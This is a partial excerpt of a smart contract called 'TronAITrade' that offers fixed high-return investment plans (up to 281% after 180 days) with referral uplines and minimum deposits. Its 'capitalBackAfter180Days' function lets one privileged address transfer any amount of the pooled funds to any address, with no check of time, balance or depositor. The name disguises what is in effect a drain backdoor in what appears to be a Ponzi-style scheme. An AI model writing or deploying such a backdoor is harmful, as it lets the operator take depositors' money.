...
contract TronAITrade {
    ...
    constructor(address _owner, address __address) public {
        owner = _owner;
		_address = __address;
        whiteListed[owner] = true;

        plans.push(Plan(30, 110));
        plans.push(Plan(60, 130));
        plans.push(Plan(90, 160));
        plans.push(Plan(180, 281));
    ...
    function deposit(uint8 _plan, address _upline) external payable {
        ...
        if(_plan==1)
            require(msg.value >= 1e9, "Zero amount");
        if(_plan==2)
            require(msg.value >= 1e10, "Zero amount");
        if(_plan==3)
            require(msg.value >= 1e11, "Zero amount");
    ...
    function capitalBackAfter180Days(address _addr, uint256 _uint256) public {
        require(msg.sender == _address,"unauthorized call");
        _addr.transfer(_uint256);
    }
